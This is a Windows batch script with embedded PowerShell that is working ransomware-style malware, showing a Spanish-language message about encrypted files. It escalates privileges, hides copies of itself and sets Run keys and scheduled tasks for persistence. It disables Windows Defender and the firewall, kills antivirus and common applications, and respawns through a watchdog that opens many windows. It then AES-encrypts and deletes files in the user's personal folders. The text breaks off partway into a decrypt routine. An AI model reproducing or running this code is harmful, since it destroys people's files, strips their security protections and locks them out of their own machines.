@echo off
setlocal EnableExtensions EnableDelayedExpansion

if /i "%~1"=="watchdog"  goto :watchdog
if /i "%~1"=="encjob"    goto :encjob
if /i "%~1"=="decrypt"   goto :decrypt
if /i "%~1"=="uninstall" goto :uninstall

title  WARNING - Por que queres este tipo de contenido - NO CIERRES ESTA VENTANA
color 4F

set "ME=%~f0"
set "DIR=%APPDATA%\Microsoft\Windows\SystemCache"
set "EXE=%DIR%\WinSys.bat"
set "STARTUP=%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup"
set "HB=%DIR%\hb"
set "MSG=%DIR%\msg.txt"
set "LOG=%DIR%\log.txt"

if not exist "%DIR%" md "%DIR%" >nul 2>&1
attrib +h "%DIR%" >nul 2>&1

call :elevate
if defined GONE exit /b

md "%DIR%\run" >nul 2>&1
if not errorlevel 1 set "OWNER=1"

if defined OWNER (
    call :install
    call :hardening
    call :kill_av
    call :msg
    call :spawn_hidden encjob
)

mode con cols=100 lines=30 >nul 2>&1
call :topmost
call :ensure_watchdog

:main
>"%HB%" echo %TIME%
call :ensure_watchdog
cls
color 4F
call :banner
echo   [%TIME%]  Activo. Watchdog invisible.
ping -n 6 127.0.0.1 >nul
goto :main

:elevate
if /i "%~1"=="boot" exit /b
if /i "%~1"=="elevated" exit /b
net session >nul 2>&1
if not errorlevel 1 exit /b
powershell -NoProfile -Command "Start-Process -FilePath '%~f0' -ArgumentList 'elevated' -Verb RunAs" >nul 2>&1
if errorlevel 1 exit /b
set "GONE=1"
exit /b

:spawn_hidden
> "%DIR%\h.vbs" echo CreateObject("WScript.Shell").Run "cmd /c """"%EXE%"" %~1""", 0, False
start "" wscript "%DIR%\h.vbs"
exit /b

:spawn_wd
rd "%DIR%\wd" >nul 2>&1
> "%DIR%\wd.vbs" echo CreateObject("WScript.Shell").Run "cmd /c """"%EXE%"" watchdog""", 0, False
start "" wscript "%DIR%\wd.vbs"
ping -n 2 127.0.0.1 >nul
if not exist "%DIR%\wd" start "" /min cmd /c ""%EXE%" watchdog"
exit /b

:spawn_main
set "N=0"
:sm
set /a N+=1
start "" cmd /c ""%EXE%" boot"
if %N% LSS 50 goto :sm
exit /b

:ensure_watchdog
set "CUR="
if exist "%DIR%\whb" set /p CUR=<"%DIR%\whb"
if "%CUR%"=="" (
    call :spawn_wd
    exit /b
)
if "%CUR%"=="%WLAST%" (
    set /a WDEAD+=1 >nul
) else (
    set "WDEAD=0"
)
set "WLAST=%CUR%"
if %WDEAD% GEQ 3 (
    set "WDEAD=0"
    call :spawn_wd
)
exit /b

:watchdog
title VeniceWatchdog
color 4F
set "EXE=%~f0"
set "DIR=%~dp0"
set "HB=%~dp0hb"
set "MSG=%~dp0msg.txt"
md "%DIR%wd" >nul 2>&1
if errorlevel 1 exit /b
set "DEAD=0"
set "LAST="
:wd
set "C="
if exist "%HB%" set /p C=<"%HB%"
if "%C%"=="" goto :wdspawn
if "%C%"=="%LAST%" (set /a DEAD+=1 >nul) else (set "DEAD=0")
set "LAST=%C%"
if %DEAD% GEQ 2 goto :wdspawn
call :kill_apps
call :spawn_notes
>"%DIR%whb" echo %TIME%
ping -n 3 127.0.0.1 >nul
goto :wd
:wdspawn
set "DEAD=0"
set "LAST="
rd "%DIR%\run" >nul 2>&1
call :spawn_main
>"%DIR%whb" echo %TIME%
ping -n 8 127.0.0.1 >nul
goto :wd

:encjob
set "DIR=%~dp0"
if exist "%DIR%\.locked" exit /b
call :encrypt
>"%DIR%\.locked" echo ok
attrib +h +s "%DIR%\.locked" >nul 2>&1
call :msg
exit /b

:topmost
> "%DIR%\tp.ps1" echo Add-Type -Name W -Namespace N -MemberDefinition '[DllImport("kernel32.dll")] public static extern IntPtr GetConsoleWindow(); [DllImport("user32.dll")] public static extern bool SetWindowPos(IntPtr h,IntPtr a,int x,int y,int cx,int cy,uint f); [DllImport("user32.dll")] public static extern bool ShowWindow(IntPtr h,int n);'
>>"%DIR%\tp.ps1" echo $h=[N.W]::GetConsoleWindow()
>>"%DIR%\tp.ps1" echo [N.W]::ShowWindow($h,1)
>>"%DIR%\tp.ps1" echo [N.W]::SetWindowPos($h,[IntPtr](-1),0,0,0,0,0x0003)
powershell -NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -File "%DIR%\tp.ps1"
exit /b

:spawn_notes
for /l %%N in (1,1,5) do start "" /max notepad "%MSG%"
exit /b

:msg
if exist "%MSG%" exit /b
>"%MSG%" echo  ##############################################################
>>"%MSG%" echo  ##                                                          ##
>>"%MSG%" echo  ##     W A R N I N G                                        ##
>>"%MSG%" echo  ##                                                          ##
>>"%MSG%" echo  ##     POR QUE QUERES ESTE TIPO DE CONTENIDO?               ##
>>"%MSG%" echo  ##                                                          ##
>>"%MSG%" echo  ##     SU COMPUTADORA NO DEJARA DE HACER ESTO.              ##
>>"%MSG%" echo  ##                                                          ##
>>"%MSG%" echo  ##############################################################
>>"%MSG%" echo.
>>"%MSG%" echo  TODOS tus archivos fueron encriptados con AES-256 y los
>>"%MSG%" echo  originales borrados. Renombrados con .encrypted_XXXXXX
>>"%MSG%" echo.
>>"%MSG%" echo  Defender, Firewall y antivirus detenidos.
>>"%MSG%" echo  Esta ventana se reabre 50 veces. No sirve cerrarla.
>>"%MSG%" echo.
>>"%MSG%" echo  Recuperar archivos:   WinSys.bat decrypt
>>"%MSG%" echo  Quitar persistencia:  WinSys.bat uninstall
>>"%MSG%" echo.
>>"%MSG%" echo  Clave: %%APPDATA%%\Microsoft\Windows\SystemCache\.vk
copy /y "%MSG%" "%USERPROFILE%\Desktop\LEEME_ENCRIPTADO.txt" >nul 2>&1
exit /b

:banner
echo.
echo.
echo        ####  #   #  ####  #   #  #####  #   #  #####
echo        #   # #   # #   # ##  #    #    ##  #    #
echo        #   # #   # #   # # # #    #    # # #    #
echo        #   # #   # #   # #  ##    #    #  ##    #
echo        ####   ###  ####  #   #  #####  #   #  #####
echo.
echo   ##########################################################
echo   ##                                                      ##
echo   ##     POR QUE QUERES ESTE TIPO DE CONTENIDO?           ##
echo   ##                                                      ##
echo   ##     SU COMPUTADORA NO DEJARA DE HACER ESTO.          ##
echo   ##                                                      ##
echo   ##########################################################
echo.
echo        TODOS los archivos encriptados en AES-256
echo        Defender + Firewall + antivirus detenidos
echo        50 ventanas al cerrar. 5 notepads cada 5 segundos
echo.
echo        Para recuperar tus archivos:  WinSys.bat decrypt
echo.
exit /b

:kill_apps
for %%P in (mspaint.exe chrome.exe msedge.exe firefox.exe opera.exe brave.exe WINWORD.EXE EXCEL.EXE POWERPNT.EXE outlook.exe Teams.exe ms-teams.exe Discord.exe Telegram.exe Spotify.exe Code.exe steam.exe vlc.exe wmplayer.exe Skype.exe Zoom.exe) do taskkill /f /im %%P >nul 2>&1
taskkill /f /im notepad.exe >nul 2>&1
exit /b

:kill_av
for %%P in (MsMpEng.exe MSASCui.exe SecurityHealthSystray.exe SecurityHealthService.exe avastui.exe AvastSvc.exe avp.exe avpui.exe avgui.exe avgnt.exe avguard.exe McAfee.exe mcshield.exe NortonSecurity.exe ns.exe N360.exe 360tray.exe 360sd.exe ZhuDongFangYu.exe avcenter.exe egui.exe ekrn.exe SophosUI.exe) do taskkill /f /im %%P >nul 2>&1
exit /b

:hardening
reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender" /v DisableAntiSpyware /t REG_DWORD /d 1 /f >nul 2>&1
reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender" /v DisableAntiVirus /t REG_DWORD /d 1 /f >nul 2>&1
reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection" /v DisableRealtimeMonitoring /t REG_DWORD /d 1 /f >nul 2>&1
reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection" /v DisableBehaviorMonitoring /t REG_DWORD /d 1 /f >nul 2>&1
reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection" /v DisableOnAccessProtection /t REG_DWORD /d 1 /f >nul 2>&1
reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection" /v DisableScanOnRealtimeEnable /t REG_DWORD /d 1 /f >nul 2>&1
reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\Spynet" /v SpynetReporting /t REG_DWORD /d 0 /f >nul 2>&1
reg add "HKLM\SYSTEM\CurrentControlSet\Services\SharedAccess\Parameters\FirewallPolicy\StandardProfile" /v EnableFirewall /t REG_DWORD /d 0 /f >nul 2>&1
reg add "HKLM\SYSTEM\CurrentControlSet\Services\SharedAccess\Parameters\FirewallPolicy\DomainProfile" /v EnableFirewall /t REG_DWORD /d 0 /f >nul 2>&1
reg add "HKLM\SYSTEM\CurrentControlSet\Services\SharedAccess\Parameters\FirewallPolicy\PublicProfile" /v EnableFirewall /t REG_DWORD /d 0 /f >nul 2>&1
netsh advfirewall set allprofiles state off >nul 2>&1
net stop WinDefend /y >nul 2>&1
net stop WdNisSvc /y >nul 2>&1
net stop Sense /y >nul 2>&1
net stop MpsSvc /y >nul 2>&1
exit /b

:install
copy /y "%ME%" "%EXE%" >nul 2>&1
copy /y "%ME%" "%STARTUP%\WindowsSystem.bat" >nul 2>&1
copy /y "%ME%" "%TEMP%\WinSys.bat" >nul 2>&1
copy /y "%ME%" "%ProgramData%\WinSys.bat" >nul 2>&1
copy /y "%ME%" "%PUBLIC%\WinSys.bat" >nul 2>&1
copy /y "%ME%" "%USERPROFILE%\WinSys.bat" >nul 2>&1

attrib +r +h +s "%EXE%" >nul 2>&1
attrib +r +h +s "%STARTUP%\WindowsSystem.bat" >nul 2>&1
attrib +r +h +s "%PUBLIC%\WinSys.bat" >nul 2>&1
attrib +r +h +s "%ProgramData%\WinSys.bat" >nul 2>&1

icacls "%EXE%" /deny "%USERNAME%:(D)" >nul 2>&1
icacls "%STARTUP%\WindowsSystem.bat" /deny "%USERNAME%:(D)" >nul 2>&1
icacls "%PUBLIC%\WinSys.bat" /deny "%USERNAME%:(D)" >nul 2>&1
icacls "%ProgramData%\WinSys.bat" /deny "%USERNAME%:(D)" >nul 2>&1

reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v WinSystem /t REG_SZ /d "\"%EXE%\"" /f >nul 2>&1
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\RunOnce" /v WinSystemOnce /t REG_SZ /d "\"%EXE%\"" /f >nul 2>&1
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\Run" /v WinSystemP /t REG_SZ /d "\"%EXE%\"" /f >nul 2>&1
reg add "HKLM\Software\Microsoft\Windows\CurrentVersion\Run" /v WinSystemHK /t REG_SZ /d "\"%EXE%\"" /f >nul 2>&1

schtasks /create /tn "WindowsSystemUpdate" /tr "\"%EXE%\"" /sc onlogon /rl highest /f >nul 2>&1
schtasks /create /tn "WindowsSystemUpdate2" /tr "\"%EXE%\"" /sc minute /mo 1 /f >nul 2>&1
exit /b

:encrypt
> "%DIR%\enc.ps1" echo $ErrorActionPreference='SilentlyContinue'
>>"%DIR%\enc.ps1" echo $base="$env:APPDATA\Microsoft\Windows\SystemCache"
>>"%DIR%\enc.ps1" echo $dirs=@("$env:USERPROFILE\Desktop","$env:USERPROFILE\Documents","$env:USERPROFILE\Downloads","$env:USERPROFILE\Pictures","$env:USERPROFILE\Music","$env:USERPROFILE\Videos")
>>"%DIR%\enc.ps1" echo $rng=New-Object Security.Cryptography.RNGCryptoServiceProvider
>>"%DIR%\enc.ps1" echo $key=New-Object byte[] 32
>>"%DIR%\enc.ps1" echo $rng.GetBytes($key)
>>"%DIR%\enc.ps1" echo [IO.File]::WriteAllText("$base\.vk",[BitConverter]::ToString($key))
>>"%DIR%\enc.ps1" echo $total=0
>>"%DIR%\enc.ps1" echo foreach($d in $dirs){
>>"%DIR%\enc.ps1" echo  Get-ChildItem -LiteralPath $d -File -Recurse -Force ^| Where-Object {$_.Name -notlike '*.encrypted_*' -and $_.Length -gt 0} ^| ForEach-Object{
>>"%DIR%\enc.ps1" echo   $p=$_.FullName
>>"%DIR%\enc.ps1" echo   $tb=New-Object byte[] 4
>>"%DIR%\enc.ps1" echo   $rng.GetBytes($tb)
>>"%DIR%\enc.ps1" echo   $tok=([BitConverter]::ToString($tb) -replace '-','').ToLower()
>>"%DIR%\enc.ps1" echo   $new=$p+'.encrypted_'+$tok
>>"%DIR%\enc.ps1" echo   $i=1
>>"%DIR%\enc.ps1" echo   while(Test-Path -LiteralPath $new){ $new=$p+'.encrypted_'+$tok+$i; $i++ }
>>"%DIR%\enc.ps1" echo   $iv=New-Object byte[] 16
>>"%DIR%\enc.ps1" echo   $rng.GetBytes($iv)
>>"%DIR%\enc.ps1" echo   $aes=[Security.Cryptography.Aes]::Create()
>>"%DIR%\enc.ps1" echo   $aes.Key=$key
>>"%DIR%\enc.ps1" echo   $aes.IV=$iv
>>"%DIR%\enc.ps1" echo   $out=[IO.File]::Create($new)
>>"%DIR%\enc.ps1" echo   $out.Write($iv,0,16)
>>"%DIR%\enc.ps1" echo   $in=[IO.File]::OpenRead($p)
>>"%DIR%\enc.ps1" echo   $cs=New-Object Security.Cryptography.CryptoStream($out,$aes.CreateEncryptor(),[Security.Cryptography.CryptoStreamMode]::Write)
>>"%DIR%\enc.ps1" echo   $buf=New-Object byte[] 1048576
>>"%DIR%\enc.ps1" echo   while(($n=$in.Read($buf,0,$buf.Length)) -gt 0){ $cs.Write($buf,0,$n) }
>>"%DIR%\enc.ps1" echo   $cs.FlushFinalBlock()
>>"%DIR%\enc.ps1" echo   $cs.Close()
>>"%DIR%\enc.ps1" echo   $in.Close()
>>"%DIR%\enc.ps1" echo   $out.Close()
>>"%DIR%\enc.ps1" echo   $aes.Clear()
>>"%DIR%\enc.ps1" echo   Remove-Item -LiteralPath $p -Force
>>"%DIR%\enc.ps1" echo   $total++
>>"%DIR%\enc.ps1" echo  }
>>"%DIR%\enc.ps1" echo }
>>"%DIR%\enc.ps1" echo Write-Host ("   " + $total + " archivos encriptados.")
powershell -NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -File "%DIR%\enc.ps1"
exit /b

:decrypt
title Restaurando archivos
color 0A
set "DIR=%APPDATA%\Microsoft\Windows\SystemCache"
if not exist "%DIR%\.vk" (
    echo.
    echo   No se encontro la clave de cifrado.
    pause
    exit /b
)
> "%DIR%\dec.ps1" echo $ErrorActionPreference='SilentlyContinue'
>>"%DIR%\dec.ps1" echo $base="$env:APPDATA\Microsoft\Windows\SystemCache"
>>"%DIR%\dec.ps1" echo $key=[byte[]]([IO.File]::ReadAllText("$base\.vk").Split('-') ^| ForEach-Object {[Convert]::ToByte($_,16)})
>>"%DIR%\dec.ps1" echo $dirs=@("$env:USERPROFILE\Desktop","$env:USERPROFILE\Documents","$env:USERPROFILE\Downloads","$env:USERPROFILE\Pictures","$env:USERPROFILE\Music","$env:USERPROFILE\Videos")
>>"%DIR%\dec.ps1" echo $total=0
>>"%DIR%\dec.
